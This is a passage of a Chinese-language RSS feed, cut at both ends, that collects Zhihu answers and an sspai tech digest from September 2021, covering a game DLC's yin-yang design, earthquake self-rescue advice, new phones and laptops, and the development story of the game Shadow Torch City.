data-private-watermark-src=\"v2-bd34c1c9610cca0de3181c340308c3ba\"></p>\n<p>在新功法中，我们专门为其制作了阴阳两条功法树。两条树上的秘籍两两对应，其效果却完全相反。比如《升清观》《凝浊法》两本阴阳相对秘籍，一本为观想清气上升的图景，可以提高心境，但会降低灵气上限。另一本却为观想浊气凝聚下沉的过程，其效果是降低心境，提升灵气上限。两本秘籍的效果数值相等，效果却完全相反，暗合阴阳相对的设定。</p>\n<p>然而如果玩家同时学习两本秘籍，其效果虽然完全抵消，但却可以借此学到更进一步的奥秘，以《升清观》《凝浊法》为例，清浊合一后自然是重现开天辟地的过程，玩家也可更进一步的学到进阶秘籍《内景开辟》，这暗合阴阳相合的设定。</p>\n<p>在努力围绕阴阳概念制作DLC核心内容的同时，我们也在尽力还原武当山的景色。武当山官方的回答已经非常清楚，我就不再赘述了。</p>\n<p>综上所述，《武当仙踪》内表达的内容不及武当山文化的亿分之一，完全可以不买。但是武当山是一定值得去的！希望大家有空去走一走，吸一吸灵气，万一仙缘到了呢。</p>\n<p>谢谢大家</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8b7d79c1d2e22c8ed17f106fe2dce89f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"616\" data-rawheight=\"861\" data-watermark=\"watermark\" data-original-src=\"v2-8b7d79c1d2e22c8ed17f106fe2dce89f\" data-watermark-src=\"v2-8130d617c92da3498b50a9d6d962c2db\" data-private-watermark-src=\"v2-da3d65586030c228a73b2b1e3080c247\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/483819782/answer/2122164746?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483819782/answer/2122164746?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/309270921?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">了不起的修仙模拟器有哪些小技巧？</a><br><a href=\"http://www.zhihu.com/question/309084194?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《了不起的修仙模拟器》的营销手段有哪些？</a><br>\n","link":"http://www.zhihu.com/question/483819782/answer/2122164746?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中央财经委员会第十次会议提出「在高质量发展中促进共同富裕」，还有哪些内容需要关注？","date":"2021-09-16 02:27:09","description":"2021年8月17日，中央财经委员会第十次会议研究扎实促进共同富裕问题。那么，到底什么是共同富裕？我们要靠什么来实现共同富裕？有哪些好的经验可以借鉴呢？敬请关注本期#靠什么来实现共同富裕#。\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-san-nong-fa-bu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国三农发布</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480575874/answer/2118778003?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1580 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/482422533?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">学者丁一凡说「中国加强政府对市场的监管，与当前所处的历史阶段有关」，如何看待共同富裕和资本的关系？</a><br><a href=\"http://www.zhihu.com/question/464455079?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">浙江高质量发展建设共同富裕示范区第一程主要目标划定，有哪些信息值得关注？</a><br>\n","link":"http://www.zhihu.com/question/480575874/answer/2118778003?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"四川泸县发生6.0级地震，子弟兵迅疾行动！当地情况如何？有什么自救知识分享一下？","date":"2021-09-16 01:34:45","description":"\n<p>　 地震自救方法：借助“<a href=\"https://www.zhihu.com/search?q=%E7%94%9F%E5%91%BD%E4%B8%89%E8%A7%92&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A28402044%7D\" class=\"internal\">生命三角</a>”躲震难</p>\n<p><b>地震发生时我们应该怎么做：家庭避震</b></p>\n<p>　　冷静判断。地震发生时，至关重要的是要有清醒的头脑。只有镇静，才有可能运用平时学到的地震知识判断地震的大小和远近。记住，近震常以上下颠簸开始，之后才左右摇摆。远震却少上下颠簸感觉，而以左右摇摆为主。</p>\n<p>　　就近躲避。震时是跑还是躲?我国多数专家认为：震时就近躲避，震后迅速撤离到安全地方，是<a href=\"https://www.zhihu.com/search?q=%E5%BA%94%E6%80%A5%E9%81%BF%E9%9C%87&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A28402044%7D\" class=\"internal\">应急避震</a>较好的办法。发生地震时，如没有条件迅速撤离到室外，则不要急着往外跑，而应抓紧求生时间寻找合适的避震场所。</p>\n<p>　　选择合适避震空间。高层居民遇地震时，应立即躲避到结实的桌子或床下，家具旁或墙根、墙角等处可在房屋倒塌后形成<a href=\"https://www.zhihu.com/search?q=%E4%B8%89%E8%A7%92%E7%A9%BA%E9%97%B4&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A28402044%7D\" class=\"internal\">三角空间</a>，是相对安全的地点。还可以迅速逃进卫生间、储存室等面积较小的场所，这些小开间的地方是比较安全的地点。不要躲避在阳台、窗边等不安全位置。如住平房，迅速跑到门外。</p>\n<p>　　做好自我保护。选择好躲避处后应蹲下或坐下，脸朝下，额头枕在两臂上;或抓住桌腿等身边牢固的物体，以免震时摔倒或因身体失控移位而受伤;保护头颈部，低头，用手护住头部或后颈;保护眼睛，闭眼以防异物伤害;保护口鼻，有可能时，可用湿毛巾捂住口鼻，以防灰土、毒气。</p>\n<p>　　摇晃时立即关火，失火时立即灭火。更不能随便点明火，因为空气中可能有易燃易爆气体。地震的时候，关火的两次机会：第一次机会在大的晃动来临之前的小的晃动之时。在感知小的晃动的瞬间，即刻互相招呼：“地震!快关火!”关闭正在使用的取暖炉、煤气炉等。第二次机会在大的晃动停息的时候。大的晃动停息后，再一次呼喊：“关火!关火!”并去关火。如在发生大的晃动时去关火，放在煤气炉、取暖炉上面的水壶等会滑落下来，是很危险的。</p>\n<p><b>地震发生时我们应该怎么做：室外避震</b></p>\n<p>　　在户外遇到地震时，应该就地选择开阔地，趴下或蹲下避震;不要乱跑，避开人多的地方;不要随便返回室内。要远离山崖、陡坡、河岸及高压线等。避开高大建筑物或构筑物：楼房，特别是有玻璃幕墙的建筑;过街桥、立交桥;高烟囱、水塔下。避开危险物、高耸或悬挂物：变压器、电线杆、路灯、广告牌、吊车等。要保护好头部，避开危险之处。避开其他危险场所：狭窄的街道、危旧房屋、危墙、女儿墙、砖瓦及木料等物的堆放处。</p>\n<p><b>地震发生时我们应该怎么做：公共场所避震</b></p>\n<p>　　可朝着没有障碍的<a href=\"http://link.zhihu.com/?target=http%3A//huaihua.tianqi.com/tongdao/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">通道</a>躲避，听从现场工作人员的指挥，不要慌乱，不要一起拥向楼梯、出口，要避免拥挤，避免被挤到墙壁或栅栏处。在影剧院、体育馆等处：注意避开吊灯、电扇等悬挂物。在商场、书店等处：应躲在近处的大柱子、内墙角，或朝着没有障碍的通道躲避，然后屈身蹲下，用手或其他东西护头;处于楼上位置的，原则上向底层转移为好。但楼梯往往是建筑物抗震的薄弱部位，因此，要看准脱险的合适时机。</p>\n<p><b>地震发生时我们应该怎么做：学校避震</b></p>\n<p>　　日本的《<a href=\"https://www.zhihu.com/search?q=%E5%9C%B0%E9%9C%87%E6%89%8B%E5%86%8C&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A28402044%7D\" class=\"internal\">地震手册</a>》避震知识中，第一条就明确地写着“要躲在坚固的家具下”。所以，日本教师坚信，最好的办法是“藏在桌下”。但是，这个想法是以日本地震多在数十秒后结束，天花板不会落下为前提的。建筑物、天花板因强震倒塌时，会将课桌等压毁，孩子如果躲在桌子下，后果不堪设想。在教室里，应迅速躲到教室的四个角落，或迅速就地蹲下，用书包、书本等保护头部。在操场或教室外时，可原地不动蹲下，双手保护头部，注意避开高大建筑物或危险物。震后不要回到教室去。千万不要跳楼!不要到阳台上去!不可躲在窗户下!</p>\n<p><b>地震发生时我们应该怎么做：写字楼内避震</b></p>\n<p>　　震时保持冷静，震后走到户外。这是避震的国际通用守则，国内外许多起地震实例表明，在地震发生的短暂瞬间，人们在进入或离开建筑物时，被砸死砸伤的概率最大。千万不可在慌乱中跳楼，这一点极为重要。</p>\n<p>　　寻找安全空间躲避。蹲在暖气旁较安全，暖气的承载力较大，金属管道的网络性结构和弹性不易被撕裂，即使在地震大幅度晃动时也不易被甩出去;暖气管道通气性好，不容易造成人员窒息;管道内的存水还可<a href=\"http://link.zhihu.com/?target=http%3A//yanan.tianqi.com/yanchang/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">延长</a>存活期。更重要的一点是，被困人员可采用击打<a href=\"https://www.zhihu.com/search?q=%E6%9A%96%E6%B0%94%E7%AE%A1%E9%81%93&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A28402044%7D\" class=\"internal\">暖气管道</a>的方式向外界传递信息，而暖气靠外墙的位置有利于最快获得救助。</p>\n<p>　　需要特别注意的是，当躲在茶水间、卫生间这样的小开间时，尽量离炉具、<a href=\"https://www.zhihu.com/search?q=%E7%85%A4%E6%B0%94%E7%AE%A1%E9%81%93&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A28402044%7D\" class=\"internal\">煤气管道</a>远些。若茶水间、卫生间处在建筑物的犄角旮旯里，且隔断墙为薄板墙时，就不要把它选择为最佳避震场所。此外，不要钻进柜子里，因为人一旦钻进去后便立刻丧失机动性，视野受阻，四肢被缚，不仅会错过逃生机会还不利于被救;躺卧的姿势也不好，人体的平面面积加大，被击中的概率要比站立大5倍，而且很难机动变位。近水不近火。这是确保在都市<a href=\"https://www.zhihu.com/search?q=%E9%9C%87%E7%81%BE&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A28402044%7D\" class=\"internal\">震灾</a>中获得他人及时救助的重要原则。一旦被困，要设法与外界联系，除用手机联系外，可敲击管道和暖气片。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-83d2894e6774bd6643119ddeac6b0e34_720w.jpg?rss\" data-rawwidth=\"470\" data-rawheight=\"300\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-83d2894e6774bd6643119ddeac6b0e34\" data-watermark-src=\"v2-ae6df4fae764776fea227bdd0bd9aae3\" data-private-watermark-src=\"v2-cc6b5ac22339188e630338541313fb62\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ran-ling-9-30?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">鈺Yu</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/487123600/answer/2123302406?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">7 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20466160?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">地震发生后如何自救？</a><br><a href=\"http://www.zhihu.com/question/329905420?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">地震提前 60 秒预警可以挽回多少损失？普通人在这期间如何最大限度自救或减少损失？</a><br>\n","link":"http://www.zhihu.com/question/487123600/answer/2123302406?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：小米发布 11T 系列手机、华硕发布多款笔记本电脑新品等","date":"2021-09-16 00:45:50","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>小米发布 11T 系列手机</h3>\n<p>9 月 16 日，小米公司在海外正式发布了传闻已久的小米 11T 系列手机。该系列分为 11T 和 11T Pro 两款机型，整体外观近似。小米 11T 搭载联发科天玑 1200-Ultra 处理器及 LPDDR4X RAM 和 UFS 3.1 存储，而小米 11T Pro 款使用骁龙 888 和 LPDDR5 RAM。两款机型均配备了 6.67 英寸的 FHD+ 平面 AMOLED 面板，屏幕刷新率为 120Hz，触控采样率 480Hz，支持 HDR10+。此外，11T 全系采用后置三摄，由 108MP 主摄、8MP 超广角和 5MP 长焦微距相机组成。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/16/article/7c2b414c1be6f09ea6b6c07173004c7e\"><figcaption>小米 11T 外观，图片来自 techbang.com</figcaption></figure><p>小米还同步推出了定位中端的小米 11 Lite，该机型拥有骁龙 778G 处理器、6.55 英寸 FHD+ 90Hz AMOLED 屏幕和基于 64MP 主摄的后置三摄组合等配置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/522e9111ff2f38ba669709923f08f58b\"><figcaption>小米 11 Lite，图片来自新闻源</figcaption></figure><p>三款机型均确认会在欧洲市场上市，小米 11 售价 499 欧元起，小米 11T Pro 售价 649 欧元起，小米 11 Lite 售价 369 欧元起。<a href=\"https://cn.engadget.com/xiaomi-mi-11t-mi-11t-pro-mi-11-lite-131937836.html\" target=\"_blank\">来源</a></p>\n<h3>华硕推出多款笔记本电脑新品</h3>\n<p>9 月 16 日，华硕公司召开 2021 秋季新品发布会，通过线上发布了无畏、灵耀和 ProArt 等三大系列的多款新品笔记本电脑。</p>\n<p>其中，无畏系列新品为无畏 Pro 14 酷睿版和 Pro 15 锐龙版两款产品，前者定位高性能轻薄本，拥有 2.8 K OLED 显示屏，后者定位 OLED 电竞轻薄本，搭载 RTX 3050 独立显卡。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/16/article/4f4dc8a6a44306f5579a499b6d75bb6e\"><figcaption>无畏系列电脑，截取自华硕笔记本微博</figcaption></figure><p>灵耀系列更新了灵耀 Pro 14 与 Pro 16 两款产品，并推出了灵耀 X 和灵耀 X 双屏 Pro 两款新品。灵耀 X 定位高性能轻薄本，拥有 2.8 K OLED 显示屏及个性迷你屏；灵耀 X 双屏 Pro 则定位创作旗舰，拥有 4K OLED 主屏幕及 4K 触控副屏，内置 RTX 3080 独立显卡。9</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/16/article/61f40414663cc5ba14e8c5b6ba31081c\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/16/article/d132f5b25f8fe0cdc09e104f8bea81c3\"><figcaption>灵耀系列新品，图片截取自华硕笔记本微博</figcaption></figure><p>ProArt 系列推出创 16 笔记本，该产品专为设计和影像创作而生，拥有独立旋钮并深度适配 Adobe 旗下应用，最高可选至强处理器及 RTX A 系列显卡。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/16/article/7ff05ec2a698370e9f850d8f5fdbcfa3\"><figcaption>ProArt 创 16，图片截取自华硕笔记本微博</figcaption></figure><p>此外，华硕还在发布会上推出了 a 豆系列笔记本及平板电脑等新品。<a href=\"https://weibo.com/2740048604/Kyjt66w3V?from=page_1006062740048604_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment#_rnd1631726871909\" target=\"_blank\">来源</a></p>\n<h3>跑分显示 iPhone 13 Pro 的 GPU 性能获得大幅提升</h3>\n<p>据知名跑分服务 <a href=\"https://browser.geekbench.com/v5/compute/3367678\" target=\"_blank\">Geekbench 最新数据显示</a>，iPhone 13 Pro 经过 Geekbench 5 测试后得到了 14216 分的 GPU 成绩，相较 iPhone 12 Pro 的 9123 分提升了约 55%。此外，跑分还证实 iPhone 13 Pro 拥有 6GB RAM，进一步印证了 Xcode 中对 iPhone 13 系列内存大小的描述。<a href=\"https://www.macrumors.com/2021/09/15/iphone-13-pro-gpu-performance-geekbench/\" target=\"_blank\">来源</a></p>\n<h3>HomePod mini 更新后支持作为 Apple TV 扬声器</h3>\n<p>科技媒体 9to5Mac 指出，HomePod mini 在获得版本 15 的系统更新（HomePod Software Version 15）后将支持成为 Apple TV 4K 的扬声器，用户无需额外购买其它外放设备即可增强 Apple TV 4K 的播放效果。此外，该项升级还增强了 Siri 在 HomePod 上语音控制 HomeKit 设备的能力，并允许语音唤醒 Apple TV。<a href=\"https://www.engadget.com/homepod-15-update-apple-tv-homekit-213444115.html?src=rss\" target=\"_blank\">来源</a></p>\n<h3>Xbox 应用支持云端或者串流玩 Xbox 游戏</h3>\n<p>微软于 9 月 14 日正式宣布，PC 端的 Xbox 应用现在已经支持在本地串流 Xbox 游戏，针对性的微软还提供了额外的升级，允许游戏以 1080P 的分辨率，60fps 的速度进行串流，并且支持串流 Xbox 360 以及 Xbox Original 游戏，该功能支持所有支持 Xbox 的国家和地区。此外本次更新还面向 22 个国家以及地区的 Xbox Game Pass Ultimate 会员提供云端玩 Game Pass 游戏，此前该功能需要依托浏览器，而现在通过 Windows 10 上的 Xbox 应用就可以，同时增加了易于访问的控制器以及网路状态信息，游戏栏集成以及社交功能。<a href=\"https://news.xbox.com/en-us/2021/09/14/new-updates-to-xbox-app-on-windows-10/\" target=\"_blank\">来源</a></p>\n<h3>诺兰将携手环球影业打造奥本海默相关电影</h3>\n<p>近日，有媒体报道，知名导演克里斯托弗·诺兰将拍摄以「原子弹之父」奥本海默为主角的电影。目前诺兰已经确认，本片将告别合作已久的华纳影业，转而选择环球影业作为本片的投资方和发行方。有消息称该片将于 2022 年第一季度进入全面制作阶段，电影的选角工作正在进行中。<a href=\"https://www.gcores.com/articles/141716\" target=\"_blank\">来源</a></p>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购<strong>六折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>🦦 少数派「监工水獭」挂灯摆件 <a href=\"https://item.taobao.com/item.htm?id=656156847801\" target=\"_blank\">正式上架</a>，上新特惠 ￥49（原价 ￥69），活动持续至 21 日，22 日开始发货。</li>\n<li>🎁 少数派会员 <a href=\"https://sspai.com/post/68762\" target=\"_blank\">迎来大更新</a>，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>🍎 <a href=\"https://sspai.com/post/68811\" target=\"_blank\">你想要的高刷屏 iPhone、全面屏 iPad mini 都来了：Apple 发布会回顾</a>\n</li>\n<li>📷 <a href=\"https://sspai.com/post/68812\" target=\"_blank\">一图流｜一张图带你看完 Apple 2021 年秋季新品发布会</a>\n</li>\n<li>🎬 <a href=\"https://sspai.com/post/68706\" target=\"_blank\">也许是 Apple 平台最全能的视频播放 App：Infuse</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68825"},{"title":"国产游戏《暗影火炬城》PS4/PS5 版于 9 月 7 日 先行推出，游戏体验如何？","date":"2021-09-15 08:01:53","description":"\n<p><i>《暗影火炬城》终于上市了，目前还只是在海外PlayStation平台，后续要有更多的平台、语言版本等着我们。但朋友们让我找个时间上知乎写点东西，也算是个PR，能让更多人了解这款游戏的开发故事。</i></p>\n<p><i>我本人并不喜欢在社交媒体上发表言论，我的知乎账号四年来一直完全处于静默状态，微博过去4年只转发了5条，就算是微信朋友圈过去4年也只转发了不到100条动态。面形公众的写作，对我是完全陌生的领域。这四年我之所以几乎放弃掉社交网络，原因无它，就是为了能够全部身心的投入到《暗影火炬城》中去，因为我知道这是我人生中最重要的一个机会，对初创的上海钛核也是。</i></p>\n<p><i>文章预期较长，无法一次写就，慢慢更新吧，有兴趣的可以关注一下，本人或者这个答案皆可。</i></p>\n<p><br></p>\n<h3><b>一、划过天空的VR彗星</b></h3>\n<p>2017年的10月，从钛核的办公室望出去，窗外是一片地铁上盖的绿地，这片绿地准确的报告着一年四季的变化，窗外是上海温暖和煦的秋天，可对我来说却如寒冬已至。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-77f0ed2decdc03ade1af91d24cbf3154_720w.jpg?rss\" data-caption=\"从钛核的办公室向外望去\" data-size=\"normal\" data-rawwidth=\"1270\" data-rawheight=\"635\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>此时的TiGames刚刚成立一年半的时间，我们刚刚上架了《奇境守卫》的第二部DLC，告别了赶版本的阶段。要知道，自从TiGames成立以来我们全体成员可以说一直是处于全力冲刺的状态，2016年5月正式动手开始制作《奇境守卫》，只用了10个月就完成项目开发、1次就通过了Sony PlayStation的项目适用性与VR舒适度审核、2个月就完成了多语言本地化、海外年龄分级、上架准备，总计12个月就把游戏发售到了全球绝大多数的地区。这样的项目效率连我们自己觉得不可思议。可到了10月，在完成了第二部DLC上线之后，连续一个星期大家都变得比较松弛，除了中午两小时固定的休息时间，其他时候也都开始“摸鱼”，打打游戏、刷刷网页，因为大家知道《奇境守卫》已经完成，不会有后续的更新，而新项目还只停留在原型阶段，看不出马上要开始生产的样子。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e3b9b6e34852be14205668dd826bd0be_720w.jpg?rss\" data-caption=\"2017年5月美服PSN上架的《奇境守卫》Demo\" data-size=\"normal\" data-rawwidth=\"1268\" data-rawheight=\"714\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>寒意从内外两个方向袭来。此时的VR生态已经开始展现出明日黄花的架势，设备销量开始停滞，玩家开机率也直线下降，“VR元年”可能永远是明年。外部融资环境也在收紧，2017年的下半年是公认的资本寒冬，公司如果依赖概念继续融资变得极其困难。而内部更面临着极为紧迫的士气低落问题，《奇境守卫》已结束，虽然口碑尚可，但商业成绩一塌糊涂，开发成本完全没有可能回收。这个时候团队很可能会因失去目标感，而倦怠、失落，进而失望、流失。</p>\n<p>《奇境守卫》的主版本是2017年5月上架PSVR的，后来分别在7月和10月上线了两个付费DLC。制作做这两个DLC的过程中，团队多数人依然保持了对项目的热情，因为上架销售后，我们的媒体评分、玩家反馈似乎都还不错，甚至我们还得到了中国最具官方背景的游戏大奖“金翎奖”的年度最佳VR游戏。但只有我知道这款曾经爬上VR游戏销售排行版的游戏实际首月销量只有几千份而已。这意味着，整个行业的VR游戏销售都十分惨淡，没人能够通过直接销售游戏获利，大家不过都是在烧钱，或多或少罢了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-efc93da4bbf81ad642ae3a25c6ca5661_720w.jpg?rss\" data-caption=\"《奇境守卫》第一关\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>连续两个月在与一些潜在的投资人接触之后，我非常肯定短期内不会再有融资机会，也就是说我们要着手制作的下一款游戏不能再是赔钱货，TiGames必须要依靠自己产品来存活下去。显然，我们不能在继续制作没有“钱途”VR游戏了。</p>\n<p>当时，我们已经有一个5人小组开始了下一款AA级的VR游戏：“Project Halley”。没错，我们用哈雷彗星作为这个项目的代号，原因有两个：其一，是传统，在我的职业生涯中第一个成功的游戏项目代号是“Mars”，而我在腾讯前沿技术中心制作的第一个VR游戏项目代号是“Comet”，所以我为这个项目用了代号“Halley”。第二个原因，这是一款科幻题材的VR游戏，玩家将驾驶着类似黑客帝国电影中的巨大单兵机甲，在无重力的太空中飞行，战斗，听起来酷毙了。所以用个天文术语来作为游戏代号实在是再适合不过，哈雷彗星是人类最早观察到的彗星，也是天空中最明亮的彗星，潜意识里我希望它也能无比耀眼。不过我似乎忘记了，哈雷彗星在中国传统上被称为“扫把星”，这可不是什么好彩头。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f57e381f8c1980702bbd2bf23f176fca_720w.jpg?rss\" data-caption=\"Project Halley的主角机甲\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"746\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>除了“大项目”Halley，我们还有一个小项目“Project Ceres”（没错，Ceres又是一个天体）这个项目规模更小，更像是一个试验。完全是为了当年极为热门的手机AR应用而制作的。当时Apple与Google都推出了基于移动设备AR解决方案，两家的年度发布会上都不遗余力的宣称自己的AR方案即将改变世界。作为以VR作为概念的TiGames当然也得有所动作，所以我们设计了一款非常复古的AR游戏，一个AR版本的“蒙特祖玛”。我想喜欢在PC上玩休闲游戏的人一定记得这个由彩色弹珠组成的消除类游戏，蜿蜒的轨道上彩色弹珠在轨道上不断前行，玩家要从一只怪异的青蛙嘴里射出同色的弹珠来消除整个彩珠队列。我们的AR版本，将这条轨道由平面扩展到立体的空间，看起来就像一个疯狂的过山车，彩珠队列在轨道上移动，玩家需要用手机对这些彩珠队列发射同色彩珠来消除它。没错，在Ceres里，你扮演的就是那个怪异的青蛙，只不过这只青蛙拿着个手机。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-cd44e4aff65410aa52933a3c5722c719_720w.jpg?rss\" data-caption=\"Project Ceres 的测试图\" data-size=\"normal\" data-rawwidth=\"1270\" data-rawheight=\"634\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>听完我的描述，也许你还觉得这两个项目挺酷的。没错，我们当时也是这么认为的，通过头脑风暴了无数次，在一大堆“创意”中精选出来的两个“好点子”。可到了2017年10月，我知道，这些都只能是吞钱的陷阱，绝无可能为公司带来正向的现金。我们得停掉它们，毫不犹豫，然后重新出发去制作能够为TiGames带来真正希望的项目。</p>\n<h3><b>二、暗影静安</b></h3>\n<p>我是个光荣《三国志》的老粉，当年从386时代的3代、4代一路玩过来的。要说这游戏给我最大的影响，可能就是对“士气”这个数值的巨大感知，士气低落的部队就算是你集齐五虎上将也无法打下胜仗。如何保持住士气的同时，将团队平移到新的项目上，是首当其冲要解决的问题。</p>\n<p><br></p>\n<p>---------------------------------------------------------------------</p>\n<p>待更新线</p>\n<p>---------------------------------------------------------------------</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ZhangTao_TiGames?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">张弢</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485084293/answer/2122276060?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">182 